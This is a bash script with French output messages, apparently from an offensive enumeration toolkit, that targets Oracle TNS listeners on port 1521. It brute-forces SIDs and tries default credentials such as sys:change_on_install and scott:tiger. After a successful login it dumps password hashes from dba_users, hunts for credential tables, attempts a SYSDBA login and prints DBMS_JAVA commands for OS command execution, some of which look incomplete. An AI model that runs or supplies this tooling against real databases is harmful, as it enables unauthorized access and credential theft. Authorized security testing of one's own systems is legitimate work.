#!/usr/bin/env bash
# ╔══════════════════════════════════════╗
# ║   Auto-Enum — Oracle TNS (1521)     ║
# ║   Usage: ./enum_oracle.sh <TARGET> [USER] [PASS] [SID]
# ╚══════════════════════════════════════╝
source "$(dirname "$0")/lib/common.sh"

TARGET="$1"
USER="${2:-}"
PASS="${3:-}"
SID="${4:-}"

require_target "$TARGET"
banner "Oracle TNS (port 1521)" "$TARGET"
OUTDIR=$(setup_outdir "$TARGET" "oracle")

# ─── 1. FINGERPRINT ─────────────────────────────────────────
section "1. FINGERPRINT"

run "Nmap — Oracle TNS" "$OUTDIR/nmap_oracle.txt" \
    nmap -sV -sC "$TARGET" -p1521 \
    --script oracle-tns-version,oracle-sid-brute \
    -oN "$OUTDIR/nmap_oracle_raw.txt"

ORA_VER=$(grep -oP 'Oracle.*[\d.]+\|TNSLSNR.*[\d.]+' "$OUTDIR/nmap_oracle.txt" 2>/dev/null | head -1)
[[ -n "$ORA_VER" ]] && finding "Version Oracle : $ORA_VER"

# Banner TNS
info "Banner TNS"
timeout 10 nc -vn "$TARGET" 1521 <<< "\x00\x57\x00\x00\x01\x00\x00\x00\x01\x36\x01\x2c\xef\xde\x00\x56" \
    2>&1 | strings | head -20 | tee "$OUTDIR/tns_banner.txt"

# ─── 2. SID BRUTEFORCE ──────────────────────────────────────
section "2. SID BRUTEFORCE"

SID_LIST=""
for wl in \
    "/usr/share/seclists/Usernames/Oracle/oracle-sids.txt" \
    "/usr/share/seclists/Discovery/Oracle/oracle-sids.txt"; do
    [[ -f "$wl" ]] && SID_LIST="$wl" && break
done

if [[ -z "$SID_LIST" ]]; then
    cat > /tmp/oracle_sids.txt << 'EOF'
ORCL
XE
ORACLE
DB
DATABASE
PROD
DEV
TEST
BACKUP
DBA
ORADATA
ORADB
SID
DATA
EOF
    SID_LIST="/tmp/oracle_sids.txt"
    warn "Wordlist SIDs non trouvée — utilisation liste minimale"
fi

VALID_SIDS=()

if check_tool odat; then
    info "ODAT — SID bruteforce"
    run_long "ODAT SID" "$OUTDIR/odat_sid.txt" 120 \
        odat sidguesser \
        -s "$TARGET" \
        -p 1521

    # Extraire SIDs valides
    while IFS= read -r sid; do
        VALID_SIDS+=("$sid")
    done < <(grep -oP "(?<=\[\+\] SID ').*(?=')" "$OUTDIR/odat_sid.txt" 2>/dev/null)

elif check_tool tnscmd10g; then
    info "tnscmd10g — enum TNS"
    timeout 15 tnscmd10g version -h "$TARGET" 2>&1 | tee "$OUTDIR/tnscmd.txt"
    timeout 15 tnscmd10g status -h "$TARGET" 2>&1 | tee -a "$OUTDIR/tnscmd.txt"

else
    # Bruteforce manuel via nmap si rien d'autre
    info "nmap oracle-sid-brute"
    timeout 120 nmap -p1521 --script oracle-sid-brute \
        --script-args brute.firstonly=false \
        "$TARGET" 2>&1 | tee "$OUTDIR/nmap_sid_brute.txt"

    while IFS= read -r line; do
        if echo "$line" | grep -qi "valid\|found\|SID:"; then
            SID_FOUND=$(echo "$line" | grep -oP "SID:\K\S+|\b[A-Z]{2,10}\b")
            [[ -n "$SID_FOUND" ]] && VALID_SIDS+=("$SID_FOUND")
        fi
    done < "$OUTDIR/nmap_sid_brute.txt"
fi

# Ajouter SID fourni en argument
[[ -n "$SID" ]] && VALID_SIDS+=("$SID")

if [[ ${#VALID_SIDS[@]} -gt 0 ]]; then
    finding "SIDs valides trouvés : ${VALID_SIDS[*]}"
    printf '%s\n' "${VALID_SIDS[@]}" | tee "$OUTDIR/valid_sids.txt"
else
    warn "Aucun SID trouvé — ajout des SIDs communs pour tentative"
    VALID_SIDS=("ORCL" "XE" "DB")
    printf '%s\n' "${VALID_SIDS[@]}" > "$OUTDIR/valid_sids.txt"
fi

# ─── 3. AUTHENTIFICATION ────────────────────────────────────
section "3. AUTHENTIFICATION"

DEFAULT_CREDS=(
    "sys:oracle"
    "sys:change_on_install"
    "system:oracle"
    "system:manager"
    "system:password"
    "scott:tiger"
    "hr:hr"
    "dbsnmp:dbsnmp"
    "admin:admin"
    "outln:outln"
)

> "$OUTDIR/valid_creds.txt"

if check_tool odat; then
    for SID_TRY in "${VALID_SIDS[@]}"; do
        info "ODAT — brute force credentials sur SID=$SID_TRY"
        run_long "ODAT passwordguesser" "$OUTDIR/odat_brute_${SID_TRY}.txt" 120 \
            odat passwordguesser \
            -s "$TARGET" -p 1521 -d "$SID_TRY" \
            --accounts-file "$SID_LIST"

        grep "\[\+\]" "$OUTDIR/odat_brute_${SID_TRY}.txt" 2>/dev/null | \
            tee -a "$OUTDIR/valid_creds.txt"
    done
elif check_tool sqlplus; then
    # Test credentials avec sqlplus
    for SID_TRY in "${VALID_SIDS[@]}"; do
        for cred in "${DEFAULT_CREDS[@]}"; do
            u="${cred%%:*}"
            p="${cred##*:}"

            if [[ -n "$USER" && -n "$PASS" ]]; then
                u="$USER"
                p="$PASS"
            fi

            info "Test ${u}:${p} @ SID=$SID_TRY"
            RESULT=$(timeout 8 sqlplus -L \
                "${u}/${p}@${TARGET}:1521/${SID_TRY}" \
                <<< "SELECT 1 FROM DUAL;" 2>&1)

            if echo "$RESULT" | grep -q "^1$\|Connected\|1 row"; then
                success "ACCÈS ORACLE : ${u}:${p} SID=$SID_TRY"
                echo "${u}:${p}:${SID_TRY}" >> "$OUTDIR/valid_creds.txt"
                break 2
            fi

            [[ -n "$USER" && -n "$PASS" ]] && break
        done
    done
fi

# ─── 4. ENUM POST-CONNEXION ─────────────────────────────────
if [[ -s "$OUTDIR/valid_creds.txt" ]]; then
    VALID_LINE=$(head -1 "$OUTDIR/valid_creds.txt")
    V_USER=$(echo "$VALID_LINE" | cut -d: -f1)
    V_PASS=$(echo "$VALID_LINE" | cut -d: -f2)
    V_SID=$(echo "$VALID_LINE" | cut -d: -f3)
    V_SID="${V_SID:-${VALID_SIDS[0]:-ORCL}}"

    section "4. ENUM POST-CONNEXION ($V_USER@$V_SID)"

    if check_tool odat; then
        # ODAT all scan
        info "ODAT — all modules scan"
        run_long "ODAT all" "$OUTDIR/odat_all.txt" 300 \
            odat all \
            -s "$TARGET" -p 1521 -d "$V_SID" \
            -U "$V_USER" -P "$V_PASS"

        # Détecter privilèges
        if grep -qi "SYSDBA\|as sysdba\|DBA_ROLE" "$OUTDIR/odat_all.txt" 2>/dev/null; then
            finding "SYSDBA role détecté !"
            echo "SYSDBA" >> "$OUTDIR/findings.txt"
        fi

        # Java exec possible ?
        if grep -qi "java\|exec\|os command" "$OUTDIR/odat_all.txt" 2>/dev/null; then
            finding "Java/OS exec possible !"
            echo "JAVA_EXEC" >> "$OUTDIR/findings.txt"
        fi

    elif check_tool sqlplus; then
        ORA_CMD="sqlplus -S ${V_USER}/${V_PASS}@${TARGET}:1521/${V_SID}"

        info "Databases / Users Oracle"
        $ORA_CMD <<< "
            SELECT username FROM dba_users ORDER BY username;
        " 2>&1 | tee "$OUTDIR/ora_users.txt"

        info "Rôles actuels"
        $ORA_CMD <<< "
            SELECT * FROM session_roles;
        " 2>&1 | tee "$OUTDIR/ora_roles.txt"

        if grep -qi "DBA\|SYSDBA" "$OUTDIR/ora_roles.txt" 2>/dev/null; then
            finding "Rôle DBA/SYSDBA actif !"
            echo "DBA_ROLE" >> "$OUTDIR/findings.txt"
        fi

        # Hashes passwords
        info "Hashes utilisateurs Oracle"
        $ORA_CMD <<< "
            SELECT username, password FROM dba_users WHERE password IS NOT NULL;
        " 2>&1 | tee "$OUTDIR/ora_hashes.txt"

        # Tables sensibles
        info "Tables sensibles"
        $ORA_CMD <<< "
            SELECT owner, table_name FROM dba_tables
            WHERE table_name LIKE '%USER%'
               OR table_name LIKE '%PASS%'
               OR table_name LIKE '%CRED%'
               OR table_name LIKE '%SECRET%'
            ORDER BY owner, table_name;
        " 2>&1 | tee "$OUTDIR/sensitive_tables.txt"

        # RCE via Java (si DBA)
        if grep -q "DBA_ROLE\|JAVA_EXEC" "$OUTDIR/findings.txt" 2>/dev/null; then
            section "5. RCE VIA JAVA (DBA requis)"
            info "Commandes RCE Oracle Java :"
            cat << 'RCE_GUIDE'
-- Activer Java
EXEC DBMS_JAVA.GRANT_PERMISSION('PUBLIC', 'SYS:java.lang.RuntimePermission','writeFileDescriptor', '');

-- Exécuter une commande OS
SELECT UTL_FILE.GET_LINE(
    UTL_FILE.FOPEN('DIR_OBJ','output.txt','R',32767),
    output_txt) FROM dual;

-- Méthode directe (SYSDBA requis)
EXEC DBMS_JAVA.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
SELECT DBMS_JAVA.RUNJAVA('MyShell') FROM DUAL;
RCE_GUIDE
        fi
    fi

    # Connexion SYSDBA si possible
    if [[ -s "$OUTDIR/valid_creds.txt" ]] && check_tool sqlplus; then
        info "Tentative connexion as sysdba"
        timeout 8 sqlplus -L \
            "${V_USER}/${V_PASS}@${TARGET}:1521/${V_SID} as sysdba" \
            <<< "SELECT 'SYSDBA_OK' FROM DUAL;" 2>&1 | grep "SYSDBA_OK" && \
            finding "Connexion AS SYSDBA réussie !" && \
            echo "SYSDBA_ACCESS" >> "$OUTDIR/findings.txt"
    fi
fi

# ─── SUMMARY ────────────────────────────────────────────────
summary "$OUTDIR"

echo -e "${WHITE}━━━ RÉSUMÉ RAPIDE ━━━${NC}"
[[ -n "$ORA_VER" ]] && info "Version : $ORA_VER"

[[ ${#VALID_SIDS[@]} -gt 0 ]] && {
    success "SIDs valides :"
    printf '  %s\n' "${VALID_SIDS[@]}"
}

[[ -s "$OUTDIR/valid_creds.txt" ]] && {
    echo ""
    success "Credentials valides :"
    cat "$OUTDIR/valid_creds.txt"
}

[[ -s "$OUTDIR/findings.txt" ]] && {
    echo ""
    warn "FINDINGS IMPORTANTS :"
    cat "$OUTDIR/findings.txt"
}
